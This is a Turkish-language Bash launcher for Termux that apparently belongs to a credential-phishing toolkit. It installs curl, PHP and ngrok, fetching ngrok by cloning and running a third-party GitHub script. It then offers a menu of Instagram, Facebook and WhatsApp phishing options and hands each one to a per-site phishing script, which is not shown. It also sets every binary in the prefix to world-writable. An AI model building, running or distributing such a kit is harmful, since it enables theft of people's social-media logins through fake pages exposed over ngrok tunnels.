#!/bin/bash

# CURL  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/curl ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi

# PHP  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/php ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install php -y
fi

# NGROK KONTROLÜ #

if [[ ! -a $PREFIX/bin/ngrok ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termuxxtoolss/ngrok-kurulum
	cd ngrok-kurulum
	bash ngrok-kurulum.sh
	cd ..
	rm -rf ngrok-kurulum
fi

if [[ $1 == update ]];then
	cd files
	./update.sh update $2
	exit
fi

# COMMANDS SCRİPT CONTROLS #

if [[ -a files/commands/termuxxtoolssmod ]];then
	mv files/commands/termuxxtoolssmod $PREFIX/bin
	mv files/commands/link-create $PREFIX/bin
	chmod 777 $PREFIX/bin/*
fi
control=$(ps aux | grep ngrok | grep -v grep |grep -o http)
if [[ -n $control ]];then
	killall ngrok
	killall php
fi
clear
cd files
./update.sh
if [[ -a ../updates_infos ]];then
	rm ../updates_infos
	exit
fi
bash banner.sh
cd ..
printf "
\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mİNSTAGRAM PHİSHİNG\e[97m

\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[32mFACEBOOK PHİSHİNG\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mWHATSAPP PHİSHİNG\e[97m

\e[31m[\e[97mA\e[31m]\e[97m ────────── \e[33mBİLDİRİM AYARLARI\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [[ $secim == 1 ]];then
	cd files/instagram
	bash instagram_phishing.sh
elif [[ $secim == 2 ]];then
	cd files/whatsapp
	bash whatsapp_phishing.sh
elif [[ $secim == 3 ]];then
	cd files/facebook
	bash facebook_phishing.sh
elif [[ $secim == A || $secim == a ]];then
	termuxxtoolssmod --settings
	sleep 1
	bash $0
	exit
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM"
	echo
	echo
	echo
	sleep 2
	bash $0
fi

